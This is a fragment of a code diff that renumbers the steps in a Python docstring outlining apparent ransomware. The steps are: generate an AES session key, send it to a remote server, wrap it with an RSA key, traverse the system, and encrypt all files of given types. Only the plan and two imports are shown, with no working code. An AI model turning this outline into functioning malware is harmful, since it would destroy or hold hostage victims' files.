@@ -3,9 +3,9 @@
 """
 1. Generate AES session key.
 2. Send key to remote server
-2. Encrypt AES session key with public RSA key
-3. Traverse system
-4. Encrypt all files ending in (.txt, ...) with AES session key (refer to example)
+3. Encrypt AES session key with public RSA key
+4. Traverse system
+5. Encrypt all files ending in (.txt, ...) with AES session key (refer to example)
 """
 import os
 from base64 import b64encode 
